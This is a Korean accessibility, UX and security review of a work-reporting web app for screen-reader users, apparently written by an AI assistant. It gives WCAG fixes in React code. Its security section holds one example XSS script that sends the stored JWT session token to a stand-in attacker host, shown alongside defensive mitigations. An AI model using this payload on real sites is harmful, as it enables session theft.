# UI/UX 동선 검토 리포트
> 작성일: 2025-01-13
> 대상: 업무 보고 시스템 (A11Y My Works)
> 사용 환경: 데스크탑(Windows) 중심, 시각장애 사용자 (스크린리더 필수)

---

## 📋 목차
1. [시스템 현황 분석](#1-시스템-현황-분석)
2. [스크린리더 접근성 검토](#2-스크린리더-접근성-검토)
3. [보안 분석](#3-보안-분석)
4. [데스크탑 UX 개선안](#4-데스크탑-ux-개선안)
5. [Electron 전환 검토](#5-electron-전환-검토)
6. [우선순위별 실행 계획](#6-우선순위별-실행-계획)

---

## 1. 시스템 현황 분석

### 1.1 라우팅 구조
현재 시스템은 **4개의 주요 영역**으로 구성:

#### 인증 영역 (공개 접근)
- `/login` - 로그인/회원가입
- `/forgot-password` - 비밀번호 찾기
- `/reset-password` - 비밀번호 재설정

#### 사용자 개인 영역 (로그인 필요)
- `/` - 대시보드
- `/tasks` - 업무 목록
- `/tasks/new` - 업무 등록 (쓰기 권한)
- `/profile` - 프로필 관리

#### 팀 관리 영역 (task.read 권한)
- `/team/tasks` - 팀 업무 조회
- `/team/stats` - 리소스 통계

#### 시스템 관리 영역 (관리자 권한)
- `/admin/dashboard` - 관리자 대시보드
- `/members`, `/roles` - 사용자/역할 관리
- `/projects`, `/services`, `/cost-groups`, `/holidays` - 기준정보 관리

### 1.2 권한 체계
**3단계 권한 검증**:
1. **ProtectedRoute** - 로그인 여부, 회원 승인 상태
2. **PermissionGuard** - 세밀한 권한 제어 (read/write)
3. **Sidebar 메뉴 필터링** - 권한 기반 메뉴 표시

### 1.3 현재 강점
- ✅ 권한 기반 접근 제어 체계적
- ✅ Lazy loading 최적화
- ✅ 반응형 디자인
- ✅ 일부 접근성 표준 준수 (Skip to main content, aria-label)

---

## 2. 스크린리더 접근성 검토

### 2.1 대상 스크린리더
- **Windows**: NVDA (무료), JAWS (유료), Narrator (기본)
- **iOS**: VoiceOver (기본)

### 2.2 잘 구현된 부분 ✅

#### Skip Navigation
```tsx
// src/components/Layout.tsx:70
<a href="#main-content" className="sr-only-focusable">
  본문으로 바로가기
</a>
```

#### 로딩 상태 알림
```tsx
<div role="status" aria-live="polite">
  <div aria-label="페이지 로딩 중"></div>
  <span className="sr-only">페이지 로딩 중...</span>
</div>
```

#### 키보드 네비게이션
- Esc: 드롭다운/사이드바 닫기
- Alt + /: 단축키 도움말

#### LoginForm 접근성
- `aria-invalid`, `aria-describedby`로 에러 연결
- `aria-required` 명시

### 2.3 **Critical 수정 필요** ⚠️

#### 1) 폼 레이블 연결 누락 (WCAG 1.3.1 위반)

**문제:**
```tsx
// ❌ src/pages/TaskForm.tsx:146-153
<label className="block text-sm font-medium text-gray-700 mb-2">
  날짜 *
</label>
<input type="date" {...register('task_date')} />
```

**스크린리더 동작:**
- NVDA: "편집, 빈칸" (레이블 읽지 않음)
- VoiceOver: "텍스트 필드" (컨텍스트 없음)

**해결:**
```tsx
// ✅ 수정안
<label htmlFor="task_date" className="block text-sm font-medium text-gray-700 mb-2">
  <span>날짜</span>
  <span className="text-red-600" aria-label="필수 항목"> *</span>
</label>
<input
  id="task_date"
  type="date"
  {...register('task_date')}
  aria-required="true"
  aria-invalid={!!errors.task_date}
  aria-describedby={errors.task_date ? "task_date-error" : undefined}
/>
{errors.task_date && (
  <p id="task_date-error" className="mt-1 text-sm text-red-600" role="alert">
    {errors.task_date.message}
  </p>
)}
```

**영향 범위:**
- `src/pages/TaskForm.tsx`: 날짜, 업무명, 업무 상세, URL, 시간 등 **12개 필드**
- `src/pages/ProjectForm.tsx`: 프로젝트 정보 필드
- `src/pages/MemberForm.tsx`: 사용자 정보 필드
- `src/pages/RoleForm.tsx`: 역할 정보 필드

#### 2) 테이블 접근성 (WCAG 1.3.1)

**문제:**
```tsx
// ❌ src/pages/TaskList.tsx:278
<table className="min-w-full divide-y divide-gray-200">
  <thead className="bg-gray-50">
    <tr>
      <th className="px-6 py-3 text-left">날짜</th>
      <th className="px-6 py-3 text-left">업무명</th>
    </tr>
  </thead>
</table>
```

**스크린리더 동작:**
- 테이블 탐색 시 열/행 정보 제대로 전달 안 됨
- 복잡한 테이블의 경우 혼란

**해결:**
```tsx
// ✅ 수정안
<table className="min-w-full divide-y divide-gray-200">
  <caption className="sr-only">업무 보고 목록 - 총 {data.pagination.total}건</caption>
  <thead className="bg-gray-50">
    <tr>
      <th scope="col" className="px-6 py-3 text-left">날짜</th>
      <th scope="col" className="px-6 py-3 text-left">업무명</th>
      <th scope="col" className="px-6 py-3 text-left">작성자</th>
      <th scope="col" className="px-6 py-3 text-left">작업시간</th>
      <th scope="col" className="px-6 py-3 text-left">프로젝트</th>
      <th scope="col" className="px-6 py-3 text-right">작업</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td headers="날짜">2025-01-13</td>
      <td headers="업무명">UI 개선</td>
    </tr>
  </tbody>
</table>
```

**영향 범위:**
- TaskList, ProjectList, MemberList, RoleList, ServiceList, CostGroupList 등 **모든 목록 페이지**

#### 3) 버튼 컨텍스트 부족 (WCAG 2.4.6)

**문제:**
```tsx
// ❌ src/pages/TaskList.tsx:340-354
<button onClick={() => handleViewDetail(task)}>상세</button>
<Link to={`/tasks/edit/${task.task_id}`}>수정</Link>
<button onClick={() => handleDelete(task.task_id, task.task_name)}>삭제</button>
```

**스크린리더 동작:**
- NVDA: "상세 버튼, 수정 링크, 삭제 버튼" (어떤 항목인지 불명)
- 테이블 탐색 시 행마다 동일한 레이블 반복

**해결:**
```tsx
// ✅ 수정안
<button
  onClick={() => handleViewDetail(task)}
  aria-label={`${task.task_name} 업무 상세보기`}>
  상세
</button>
<Link
  to={`/tasks/edit/${task.task_id}`}
  aria-label={`${task.task_name} 업무 수정`}>
  수정
</Link>
<button
  onClick={() => handleDelete(task.task_id, task.task_name)}
  aria-label={`${task.task_name} 업무 삭제`}>
  삭제
</button>
```

#### 4) 검색 입력 레이블 없음 (WCAG 4.1.2)

**문제:**
```tsx
// ❌ src/pages/ProjectList.tsx:82
<input
  type="text"
  placeholder="프로젝트명, 코드로 검색"
  className="..."
/>
```

**해결:**
```tsx
// ✅ 수정안
<label htmlFor="project-search" className="sr-only">
  프로젝트 검색
</label>
<input
  id="project-search"
  type="search"
  role="searchbox"
  placeholder="프로젝트명, 코드로 검색"
  aria-label="프로젝트명 또는 코드로 검색"
  className="..."
/>
```

#### 5) 동적 콘텐츠 알림 (WCAG 4.1.3)

**문제:**
```tsx
// ❌ src/pages/ProjectList.tsx:34
onSuccess: () => {
  queryClient.invalidateQueries({ queryKey: ['projects'] });
  alert('프로젝트가 삭제되었습니다.'); // 스크린리더 인터럽트
}
```

**해결:**
```tsx
// ✅ 수정안 - 전역 알림 컴포넌트 생성
// src/components/Notification.tsx
export function Notification({ message, type }: Props) {
  return (
    <div
      role="status"
      aria-live="polite"
      aria-atomic="true"
      className="fixed top-4 right-4 bg-green-50 border-green-200 px-4 py-3 rounded-md">
      <p className="text-green-800">{message}</p>
    </div>
  );
}

// 사용
const [notification, setNotification] = useState('');

onSuccess: () => {
  setNotification('프로젝트가 삭제되었습니다.');
  setTimeout(() => setNotification(''), 5000);
}
```

#### 6) 모달 접근성 (WCAG 2.4.3)

**문제:**
```tsx
// ❌ src/pages/TaskList.tsx:449
<div className="fixed inset-0 bg-black bg-opacity-50">
  <div className="bg-white rounded-lg shadow-xl p-6">
    <h2>업무 상세 정보</h2>
    {/* 내용 */}
  </div>
</div>
```

**스크린리더 동작:**
- 모달 열릴 때 포커스 이동 안 됨
- Tab 키로 모달 뒤의 콘텐츠 접근 가능 (혼란)

**해결:**
```tsx
// ✅ 수정안 - FocusTrap 라이브러리 사용 권장
import FocusTrap from 'focus-trap-react';

<FocusTrap active={showDetailModal}>
  <div
    role="dialog"
    aria-modal="true"
    aria-labelledby="dialog-title"
    className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div className="bg-white rounded-lg shadow-xl p-6 max-w-2xl w-full">
      <div className="flex items-center justify-between mb-4">
        <h2 id="dialog-title" className="text-xl font-bold">
          업무 상세 정보
        </h2>
        <button
          onClick={() => setShowDetailModal(false)}
          aria-label="모달 닫기">
          <svg>...</svg>
        </button>
      </div>
      {/* 내용 */}
    </div>
  </div>
</FocusTrap>
```

**필요 패키지:**
```bash
pnpm add focus-trap-react @types/focus-trap-react
```

#### 7) 드롭다운/Select 접근성

**문제:**
```tsx
// ❌ src/pages/TaskForm.tsx:249
<select
  {...register('cost_group_id', { valueAsNumber: true })}
  className="...">
  <option value="">선택하세요</option>
  {costGroups?.map((cg) => (
    <option key={cg.cost_group_id} value={cg.cost_group_id}>
      {cg.name}
    </option>
  ))}
</select>
```

**개선:**
```tsx
// ✅ 수정안
<label htmlFor="cost_group_id" className="...">
  청구 그룹
</label>
<select
  id="cost_group_id"
  {...register('cost_group_id', { valueAsNumber: true })}
  aria-label="청구 그룹 선택"
  className="...">
  <option value="">청구 그룹을 선택하세요</option>
  {costGroups?.map((cg) => (
    <option key={cg.cost_group_id} value={cg.cost_group_id}>
      {cg.name}
    </option>
  ))}
</select>

{/* 계층적 select의 경우 */}
<div role="group" aria-labelledby="project-selection-label">
  <span id="project-selection-label" className="sr-only">
    프로젝트 선택 (청구 그룹, 서비스, 프로젝트 순서)
  </span>
  {/* 청구 그룹 select */}
  {/* 서비스 select - aria-disabled when parent not selected */}
  {/* 프로젝트 select - aria-disabled when parent not selected */}
</div>
```

### 2.4 보조 기술 테스트 체크리스트

#### Windows (NVDA/JAWS)
- [ ] 모든 폼 필드 레이블 읽힘
- [ ] 필수 필드 안내 들림
- [ ] 에러 메시지 즉시 알림
- [ ] 테이블 셀 내용과 헤더 연결
- [ ] 버튼 목적 명확히 들림
- [ ] 모달 열릴 때 포커스 이동
- [ ] Tab 순서 논리적

#### iOS (VoiceOver)
- [ ] 제스처로 모든 요소 접근
- [ ] 버튼/링크 구분 명확
- [ ] 폼 필드 레이블 읽힘
- [ ] 탭 순서 논리적

---

## 3. 보안 분석

### 3.1 현재 보안 아키텍처

```
웹 브라우저 (클라이언트)
  ├─ LocalStorage: JWT 세션 저장
  ├─ VITE_SUPABASE_ANON_KEY: 클라이언트 번들에 포함
  └─ Supabase Client SDK
        ↓
Supabase Backend
  ├─ Auth API: JWT 인증/갱신
  ├─ PostgreSQL: RLS(Row Level Security) 적용
  └─ Storage: 파일 업로드
```

### 3.2 보안 강점
- ✅ RLS(Row Level Security) - 데이터베이스 레벨 권한 제어
- ✅ RBAC (Role-Based Access Control) - 세밀한 권한 관리
- ✅ PKCE 플로우 지원 (`.doc/security-design.md:79`)
- ✅ 자동 토큰 갱신
- ✅ 비밀번호 해싱 (Bcrypt)

### 3.3 보안 취약점 (웹 환경 한계)

#### 1) LocalStorage XSS 공격 취약점
```javascript
// 현재: localStorage에 JWT 저장
// 공격: XSS로 토큰 탈취 가능
<script>
  fetch('https://attacker.com', {
    method: 'POST',
    body: localStorage.getItem('a11y-my-wooks-auth')
  });
</script>
```

**완화 방안 (웹):**
```javascript
// 1. CSP (Content Security Policy) 헤더 추가
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               connect-src 'self' https://*.supabase.co;
               script-src 'self';">

// 2. HttpOnly 쿠키 사용 (Supabase 설정 필요)
// 3. 세션 타임아웃 강화 (30분)
```

#### 2) 브라우저 DevTools 노출
- 모든 API 호출 관찰 가능
- 네트워크 탭에서 요청/응답 확인
- React DevTools로 상태 확인

**완화 방안:**
```javascript
// Production 빌드 시 디버그 모드 비활성화
if (import.meta.env.PROD) {
  console.log = () => {};
  console.warn = () => {};
}
```

### 3.4 보안 개선 권장사항

#### 즉시 적용 가능 (웹)
1. **CSP 헤더 추가** (`index.html`)
2. **세션 타임아웃 30분** 설정
3. **민감 데이터 마스킹** (이메일, 전화번호)
4. **HTTPS 강제** (프로덕션)

#### Electron 전환 시 추가 보안
1. **암호화된 스토리지** (electron-store)
2. **IPC 통신으로 토큰 은닉**
3. **Context Isolation** 필수
4. **코드 서명** (인증서)

---

## 4. 데스크탑 UX 개선안

### 4.1 높은 우선순위 (즉시 개선)

#### 1) 업무 등록 동선 일관성 ⭐⭐⭐⭐⭐

**문제:**
- 좌측 메뉴: "업무 등록" (`Sidebar.tsx:33`)
- 업무 목록: "업무 등록" 버튼 (`TaskList.tsx:119`)
- 중복 진입점 혼란

**해결:**
```tsx
// 좌측 메뉴에서 "업무 등록" 제거
// 우측 상단에 빠른 액션 버튼 추가
<header>
  <button
    onClick={() => navigate('/tasks/new')}
    className="px-4 py-2 bg-blue-600 text-white"
    aria-label="새 업무 등록 (Ctrl+N)">
    ⚡ 업무 등록
  </button>
</header>

// 키보드 단축키 추가
if (e.ctrlKey && e.key === 'n') {
  e.preventDefault();
  navigate('/tasks/new');
}
```

#### 2) 대시보드 정보 계층화 ⭐⭐⭐⭐⭐

**문제:**
- 7개 섹션 동시 로딩 → 정보 과부하

**해결:**
```tsx
<Dashboard>
  <Tabs defaultValue="summary">
    <TabList aria-label="대시보드 섹션">
      <Tab value="summary">오늘의 요약</Tab>
      <Tab value="charts">통계 & 차트</Tab>
      <Tab value="team">팀 현황</Tab>
    </TabList>

    <TabPanel value="summary">
      <QuickStats />
      <TodayTasks />
    </TabPanel>

    <TabPanel value="charts">
      <DailyChart />
      <ProjectStats />
    </TabPanel>
  </Tabs>
</Dashboard>
```

#### 3) 필터 단순화 ⭐⭐⭐⭐

**해결:**
```tsx
<FilterPanel collapsible>
  {/* 기본 필터 */}
  <FilterGroup>
    <QuickDateButtons>
      <button>오늘</button>
      <button>이번 주</button>
      <button>이번 달</button>
    </QuickDateButtons>
  </FilterGroup>

  {/* 고급 필터 (접기 가능) */}
  <Collapsible title="고급 검색">
    <CascadingSelect />
  </Collapsible>

  {/* 저장된 필터 */}
  <SavedFilters />
</FilterPanel>
```

### 4.2 중간 우선순위

#### 4) 테이블 가상 스크롤링 ⭐⭐⭐
```tsx
import { useVirtualizer } from '@tanstack/react-virtual';

// 1000+ 행 처리
const virtualizer = useVirtualizer({
  count: data.length,
  getScrollElement: () => parentRef.current,
  estimateSize: () => 50,
});
```

#### 5) 키보드 단축키 확장 ⭐⭐⭐
```
Ctrl + N: 새 업무 등록
Ctrl + F: 검색 포커스
Ctrl + E: Excel 내보내기
Ctrl + /: 단축키 도움말
```

#### 6) Excel 내보내기 ⭐⭐⭐
```tsx
import * as XLSX from 'xlsx';

function exportToExcel(data) {
  const ws = XLSX.utils.json_to_sheet(data);
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, ws, "업무보고");
  XLSX.writeFile(wb, `업무보고_${new Date().toISOString()}.xlsx`);
}
```

---

## 5. Electron 전환 검토

### 5.1 Electron 보안 이점

```javascript
// Main Process (Node.js) - 클라이언트 노출 안 됨
const store = new Store({
  encryptionKey: 'your-key',  // 암호화된 토큰 저장
});

// IPC 통신으로 API 호출 (토큰 은닉)
ipcMain.handle('api-call', async (event, endpoint) => {
  const token = store.get('auth_token');
  return await fetch(endpoint, {
    headers: { Authorization: `Bearer ${token}` }
  });
});
```

### 5.2 추가 이점
- 오프라인 작업 (SQLite 캐싱)
- 자동 업데이트
- 시스템 트레이
- 로컬 파일 시스템 접근
- Windows 통합 인증

### 5.3 전환 비용
- **개발 기간**: 2-3주
- **코드 서명 인증서**: 연 30-50만원
- **기술 스택 추가**: Electron, electron-store, electron-updater

### 5.4 최종 결정
> **현재: Electron 전환 보류**
> 사유: 웹 기반 보안 강화로 충분히 대응 가능

---

## 6. 우선순위별 실행 계획

### Phase 1: 접근성 개선 (즉시 - 1주)
**목표**: 스크린리더 사용자가 모든 기능 사용 가능

1. ✅ **폼 레이블 연결** (1일)
   - 모든 `<label>`에 `htmlFor` 추가
   - `<input>`에 `id`, `aria-required`, `aria-invalid` 추가

2. ✅ **에러 메시지 연결** (1일)
   - `aria-describedby`로 에러 메시지 연결
   - `role="alert"` 추가

3. ✅ **테이블 접근성** (1일)
   - `<caption>`, `scope="col"` 추가

4. ✅ **버튼 레이블** (1일)
   - 모든 버튼에 명확한 `aria-label`

5. ✅ **검색 입력 레이블** (0.5일)

6. ✅ **모달 접근성** (1.5일)
   - `focus-trap-react` 설치
   - `role="dialog"`, `aria-modal` 추가

7. ✅ **전역 알림 컴포넌트** (1일)
   - `alert()` 대체

### Phase 2: 보안 강화 (병행 가능 - 1주)

8. ✅ **CSP 헤더 추가** (0.5일)
9. ✅ **세션 타임아웃 30분** (0.5일)
10. ✅ **민감 데이터 마스킹** (1일)

### Phase 3: 데스크탑 UX 개선 (2주)

11. ✅ **업무 등록 동선 일관성** (1일)
12. ✅ **대시보드 탭 구조** (2일)
13. ✅ **필터 단순화** (2일)
14. ✅ **키보드 단축키** (1일)
15. ✅ **테이블 가상 스크롤** (2일)
16. ✅ **Excel 내보내기** (1일)

### Phase 4: 테스트 및 검증 (1주)

17. ✅ **NVDA/JAWS 테스트** (2일)
18. ✅ **VoiceOver 테스트** (1일)
19. ✅ **키보드 네비게이션 테스트** (1일)
20. ✅ **보안 점검** (1일)

---

## 7. 결론 및 권장사항

### 즉시 조치 필요 (Critical)
1. **폼 레이블 연결** - 법적 요구사항 (장애인차별금지법)
2. **테이블 접근성** - WCAG 2.1 Level A
3. **버튼 컨텍스트** - 사용자 경험 핵심

### 단기 목표 (1개월)
- Phase 1-2 완료
- NVDA/JAWS 테스트 통과
- 시각장애 사용자 피드백 수집

### 중기 목표 (3개월)
- Phase 3 완료
- 데스크탑 UX 최적화
- Electron 전환 재검토

### Electron 전환
> **현재 결정: 보류**
> 웹 기반 접근성 개선 후 재평가

---

## 부록: 체크리스트

### 접근성 체크리스트 (WCAG 2.1 Level AA)

#### 1.3.1 Info and Relationships (Level A)
- [ ] 모든 폼 필드에 `<label>` 연결
- [ ] 테이블에 `<caption>`, `<th scope="col">`

#### 2.4.6 Headings and Labels (Level AA)
- [ ] 버튼/링크에 명확한 레이블
- [ ] 페이지 제목 적절

#### 4.1.2 Name, Role, Value (Level A)
- [ ] 모든 UI 컴포넌트에 role
- [ ] aria-required, aria-invalid 명시

#### 4.1.3 Status Messages (Level AA)
- [ ] 동적 콘텐츠에 aria-live
- [ ] 에러 메시지 즉시 알림

### 보안 체크리스트
- [ ] CSP 헤더 설정
- [ ] HTTPS 강제
- [ ] 세션 타임아웃 30분
- [ ] 민감 데이터 마스킹
- [ ] RLS 정책 검증

### 데스크탑 UX 체크리스트
- [ ] 키보드 단축키 구현
- [ ] 테이블 정렬/필터
- [ ] Excel 내보내기
- [ ] 와이드 스크린 최적화

---

**문서 버전**: 1.0
**최종 업데이트**: 2025-01-13
**작성자**: Claude (AI Assistant)
**검토 필요**: 개발팀, 접근성 전문가
